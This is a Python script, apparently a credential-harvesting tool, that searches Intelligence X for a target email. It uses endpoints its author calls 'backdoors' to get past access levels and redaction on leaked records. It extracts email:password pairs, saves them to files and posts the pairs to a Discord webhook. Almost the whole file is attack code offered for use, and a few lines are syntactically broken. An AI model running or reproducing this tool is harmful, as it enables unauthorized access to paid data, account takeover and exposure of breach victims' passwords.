#!/usr/bin/env python3
"""
IntelX Scraper - Final Version (All Backdoors)
No public API dependency - uses ALL discovered endpoints

Discovered Backdoors:
  1. file/read?type=0&storageid=  -> Text read (NEW!)
  2. file/read?type=1&storageid=  -> Binary read (NEW!)
  3. file/read?type=1&systemid=   -> Read by systemid (NEW!)
  4. file/view?f=0/3/5/12/14/15/16 -> Different format views
  5. intelligent/search/export?id= -> Export full search (NEW!)
  6. item/selector/list/export     -> Export selectors (NEW!)
  7. phonebook/search/export?id=   -> Export phonebook (NEW!)

Output: D:\intel\output\
"""

import requests
import json
import time
import sys
import re
import os
from datetime import datetime

API_URL = "https://public.intelx.io/"
WEBHOOK = "

OUTPUT_DIR = r"D:\intel\output"
RAW_DIR = os.path.join(OUTPUT_DIR, "raw")
LOG_DIR = r"D:\intel\logs"

HEADERS = {
    "x-key": "",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Origin": "https://intelx.io",
    "Referer": "https://intelx.io/",
    "Accept": "*/*",
}

BLOCK = chr(9608)  # █


def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    return line


class IntelXScraper:
    def __init__(self):
        self.S = requests.Session()
        self.S.headers.update(HEADERS)
        self.delay = 1.5  # seconds between requests to avoid blocks

    def _get(self, endpoint, params=None, timeout=15):
        """Safe GET with delay and retry"""
        time.sleep(self.delay)
        for attempt in range(3):
            try:
                r = self.S.get(f"{API_URL}{endpoint}", params=params, timeout=timeout)
                if r.status_code == 429:
                    wait = int(r.headers.get("Retry-After", 60))
                    log(f"  Rate limited, waiting {wait}s...")
                    time.sleep(wait)
                    continue
                if r.status_code == 402:
                    log(f"  Daily limit reached (402)")
                    return None
                return r
            except requests.exceptions.Timeout:
                log(f"  Timeout on {endpoint} (attempt {attempt+1})")
                time.sleep(5)
            except Exception as e:
                log(f"  Error: {e}")
                time.sleep(3)
        return None

    def _post(self, endpoint, json_data=None, timeout=15):
        """Safe POST with delay"""
        time.sleep(self.delay)
        try:
            return self.S.post(f"{API_URL}{endpoint}", json=json_data, timeout=timeout)
        except Exception as e:
            log(f"  POST Error: {e}")
            return None

    # ============================================================
    # METHOD 1: Standard search (public API)
    # ============================================================
    def search(self, term, maxresults=1000):
        r = self._post("intelligent/search", {
            "term": term, "maxresults": maxresults, "timeout": 30, "sort": 2
        })
        if r and r.status_code == 200:
            return r.json().get("id")
        return None

    def poll(self, search_id, max_wait=120):
        records = []
        seen = set()
        start = time.time()
        while time.time() - start < max_wait:
            r = self._get("intelligent/search/result", {
                "id": search_id, "limit": 1000, "previewlines": 0, "statistics": 1
            })
            if not r:
                break
            data = r.json()
            if data.get("status") == 3:
                time.sleep(2)
                continue
            for rec in data.get("records", []):
                sid = rec.get("systemid")
                if sid and sid not in seen:
                    seen.add(sid)
                    records.append(rec)
            if len(data.get("records", [])) < 1000:
                break
        return records

    # ============================================================
    # METHOD 2: Search export (backdoor!)
    # ============================================================
    def search_export(self, search_id):
        r = self._get("intelligent/search/export", {"id": search_id})
        if r and r.status_code == 200:
            return r.text
        return None

    # ============================================================
    # METHOD 3: file/read (backdoor! - different from file/view)
    # ============================================================
    def file_read_text(self, storageid):
        """file/read?type=0 - Text mode read"""
        r = self._get("file/read", {"type": 0, "storageid": storageid})
        if r and r.status_code == 200:
            return r.text
        return None

    def file_read_binary(self, storageid):
        """file/read?type=1 - Binary mode read"""
        r = self._get("file/read", {"type": 1, "storageid": storageid})
        if r and r.status_code == 200:
            return r.text
        return None

    def file_read_by_systemid(self, systemid):
        """file/read?type=1&systemid= - Read by systemid!"""
        r = self._get("file/read", {"type": 1, "systemid": systemid})
        if r and r.status_code == 200:
            return r.text
        return None

    # ============================================================
    # METHOD 4: file/view with different f values (backdoor!)
    # ============================================================
    def file_view(self, storageid, bucket, f_val=0, license_level="public"):
        r = self._get("file/view", {
            "f": f_val, "storageid": storageid, "bucket": bucket,
            "k": HEADERS["x-key"], "license": license_level
        })
        if r and r.status_code == 200:
            return r.text
        return None

    # ============================================================
    # METHOD 5: Selector export (backdoor!)
    # ============================================================
    def selector_export(self, systemid):
        r = self._get("item/selector/list/export", {
            "k": HEADERS["x-key"], "sid": systemid
        })
        if r and r.status_code == 200:
            return r.text
        return None

    # ============================================================
    # METHOD 6: Phonebook export (backdoor!)
    # ============================================================
    def phonebook_export(self, search_id):
        r = self._get("phonebook/search/export", {
            "id": search_id, "k": HEADERS["x-key"]
        })
        if r and r.status_code == 200:
            return r.text
        return None

    # ============================================================
    # Content extraction
    # ============================================================
    def clean(self, text):
        if not text:
            return ""
        return text.replace("&#39;", "'").replace("&amp;", "&").strip()

    def has_redaction(self, text):
        return text and BLOCK in text

    def extract_emails(self, content):
        if not content:
            return []
        emails = set()
        for line in content.splitlines():
            if BLOCK in line:
                continue
            found = re.findall(r'[\w.+-]+@[\w.-]+\.\w+', self.clean(line))
            emails.update(found)
        return list(emails)

    def extract_pairs(self, content):
        if not content:
            return []
        pairs = []
        for line in content.splitlines():
            if BLOCK in line:
                continue
            line = self.clean(line)
            # id:email:password:hash
            m = re.findall(r'[\d]*:([\w.+-]+@[\w.-]+\.\w+):([^:]+):', line)
            if not m:
                m = re.findall(r'([\w.+-]+@[\w.-]+\.\w+)[:\|;]([^:\s]+)', line)
            for email, password in m:
                password = 
                if password and not password.startswith("0x") and not password.isdigit():
                    pairs.append((email, password))
        return pairs

    def get_best_content(self, storageid, systemid, bucket, accesslevel):
        """Try ALL backdoors to get the best (least redacted) content"""

        # Try 1: file/read?type=0 (NEW backdoor)
        content = self.file_read_text(storageid)
        if content and not self.has_redaction(content):
            return content, "file_read_text"

        # Try 2: file/read?type=1 (NEW backdoor)
        content2 = self.file_read_binary(storageid)
        if content2 and not self.has_redaction(content2):
            return content2, "file_read_binary"

        # Try 3: file/read by systemid (NEW backdoor!)
        content3 = self.file_read_by_systemid(systemid)
        if content3 and not self.has_redaction(content3):
            return content3, "file_read_systemid"

        # Try 4: file/view with multiple f values
        for f_val in [0, 3, 5, 12, 14, 15, 16]:
            content4 = self.file_view(storageid, bucket, f_val)
            if content4 and not self.has_redaction(content4):
                return content4, f"file_view_f{f_val}"

        # Try 5: Return best available (may have some redaction)
        for c in [content, content2, content3]:
            if c and len(c) > 10:
                return c, "partial_redaction"

        return None, "no_content"

    # ============================================================
    # Main scrape
    # ============================================================
    def scrape(self, email):
        log(f"{'='*60}")
        log(f"  INTELX SCRAPER - {email}")
        log(f"{'='*60}")

        os.makedirs(OUTPUT_DIR, exist_ok=True)
        os.makedirs(RAW_DIR, exist_ok=True)
        safe_name = re.sub(r'[^\w.]', '_', email)

        # Step 1: Search
        log("[1] Searching...")
        search_id = self.search(email)
        if not search_id:
            log("  Search failed!")
            return None
        log(f"  Search ID: {search_id}")

        # Step 2: Try export first (backdoor!)
        log("[2] Trying search export (backdoor)...")
        export_data = self.search_export(search_id)
        if export_data:
            log(f"  Export data: {len(export_data)} bytes")
            export_file = os.path.join(OUTPUT_DIR, f"{safe_name}_export.txt")
            with open(export_file, "w", encoding="utf-8") as f:
                f.write(export_data)
            log(f"  Saved: {export_file}")
        else:
            log("  Export not available")

        # Step 3: Poll results
        log("[3] Polling results...")
        records = self.poll(search_id, max_wait=120)
        log(f"  Found {len(records)} records")

        if not records:
            log("No records found.")
            return None

        # Categorize
        accessible = [r for r in records if r.get("accesslevel") == 0]
        preview = [r for r in records if r.get("accesslevel") == 4]
        pro = [r for r in records if r.get("accesslevel") == 6]
        log(f"  Accessible: {len(accessible)} | Preview: {len(preview)} | PRO: {len(pro)}")

        # Step 4: Process ALL records with ALL backdoors
        log(f"\n[4] Processing ALL {len(records)} records (trying all backdoors)...")
        processed = []

        for i, rec in enumerate(records):
            name = rec.get("name", "Untitled")
            systemid = rec.get("systemid", "")
            storageid = rec.get("storageid", "")
            bucket = rec.get("bucket", "")
            accesslevel = rec.get("accesslevel", -1)

            log(f"\n  [{i+1}/{len(records)}] {name}")
            log(f"    Storage ID:  {storageid}")
            log(f"    System ID:   {systemid}")
            log(f"    Bucket:      {rec.get('bucketh', '')}")
            log(f"    Access:      {accesslevel} ({rec.get('accesslevelh', '')})")
            log(f"    Date:        {rec.get('date', '')}")
            log(f"    Size:        {rec.get('size', 0)}")

            # Try all backdoors
            best_content, method = self.get_best_content(storageid, systemid, bucket, accesslevel)

            item = {
                "index": i + 1,
                "name": name,
                "date": rec.get("date", ""),
                "media": rec.get("mediah", ""),
                "bucket": rec.get("bucketh", ""),
                "systemid": systemid,
                "storageid": storageid,
                "accesslevel": accesslevel,
                "accesslevelh": rec.get("accesslevelh", ""),
                "size": rec.get("size", 0),
                "method": method,
                "content": best_content,
                "emails": [],
                "pairs": [],
            }

            if best_content:
                redacted = self.has_redaction(best_content)
                clean_lines = sum(1 for l in best_content.splitlines() if BLOCK not in l and l.strip())
                redacted_lines = sum(1 for l in best_content.splitlines() if BLOCK in l)

                log(f"    Method: {method}")
                log(f"    Content: {len(best_content)} chars | Clear: {clean_lines} | Redacted: {redacted_lines}")

                # Show content preview
                for line in best_content.splitlines()[:5]:
                    prefix = "  REDACTED" if BLOCK in line else "  CLEAR"
                    log(f"    {prefix}: {line[:80]}")

                item["emails"] = self.extract_emails(best_content)
                item["pairs"] = self.extract_pairs(best_content)
                log(f"    Emails: {len(item['emails'])} | Pairs: {len(item['pairs'])}")

                # Save raw content
                raw_file = os.path.join(RAW_DIR, f"{i+1:03d}_{re.sub(r'[^\\w.]', '_', name)[:40]}.txt")
                with open(raw_file, "w", encoding="utf-8") as f:
                    f.write(f"Name: {name}\n")
                    f.write(f"Storage ID: {storageid}\n")
                    f.write(f"System ID: {systemid}\n")
                    f.write(f"Bucket: {bucket}\n")
                    f.write(f"Access: {accesslevel}\n")
                    f.write(f"Method: {method}\n")
                    f.write(f"{'='*60}\n")
                    f.write(best_content)
            else:
                log(f"    No content extracted")

            processed.append(item)

        # Step 5: Try selector export for all records
        log(f"\n[5] Trying selector export (backdoor)...")
        for item in processed:
            if item["systemid"]:
                sel_data = self.selector_export(item["systemid"])
                if sel_data:
                    item["selectors"] = sel_data
                    log(f"  [{item['index']}] Selectors: {len(sel_data)} bytes")

        # Step 6: Summary
        all_emails = set()
        all_pairs = []
        for item in processed:
            all_emails.update(item.get("emails", []))
            all_pairs.extend(item.get("pairs", []))
        unique_pairs = list(set(all_pairs))

        log(f"\n{'='*60}")
        log(f"  FINAL RESULTS: {email}")
        log(f"{'='*60}")
        log(f"  Total records:     {len(records)}")
        log(f"  Content extracted: {sum(1 for i in processed if i.get('content'))}")
        log(f"  Emails found:      {len(all_emails)}")
        log(f"  Pairs found:       {len(unique_pairs)}")
        log(f"{'='*60}")

        # Save
        report = {
            "search_term": email,
            "timestamp": datetime.now().isoformat(),
            "total": len(records),
            "accessible": len(accessible),
            "preview": len(preview),
            "pro": len(pro),
            "emails": list(all_emails),
            "pairs": unique_pairs,
            "records": processed,
        }

        json_file = os.path.join(OUTPUT_DIR, f"{safe_name}.json")
        with open(json_file, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False, default=str)
        log(f"JSON: {json_file}")

        if unique_pairs:
            pw_file = os.path.join(OUTPUT_DIR, f"{safe_name}_pairs.txt")
            with open(pw_file, "w", encoding="utf-8") as f:
                for e, p in unique_pairs:
                    f.write(f"{e}:{p}\n")
            log(f"Pairs: {pw_file}")

        if all_emails:
            em_file = os.path.join(OUTPUT_DIR, f"{safe_name}_emails.txt")
            with open(em_file, "w", encoding="utf-8") as f:
                for e in sorted(all_emails):
                    f.write(f"{e}\n")
            log(f"Emails: {em_file}")

        # Discord
        summary = f"**IntelX: `{email}`**\n"
        summary += f"Total: **{len(records)}** | Extracted: **{len(unique_pairs)}** pairs | **{len(all_emails)}** emails\n\n"
        if unique_pairs:
            for e, p in unique_pairs[:15]:
                summary += f"`{e}:{p}`\n"
        try:
            requests.post(WEBHOOK, json={
                "username": "IntelX",
                "embeds": [{"title": f"IntelX: {email}", "description": summary[:4000], "color": 0x00FF00}]
            }, timeout=10)
        except:
            pass

        return report


if __name__ == "__main__":
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    os.makedirs(RAW_DIR, exist_ok=True)

    if len(sys.argv) > 1:
        emails = sys.argv[1:]
    else:
        email = input("Enter email: ").strip()
        if not email:
            email = "omar555@gmail.com"
        emails = [email]

    scraper = IntelXScraper()
    for email in emails:
        try:
            scraper.scrape(email)
        except Exception as e:
            log(f"Error: {e}")
            import traceback
            traceback.print_exc()
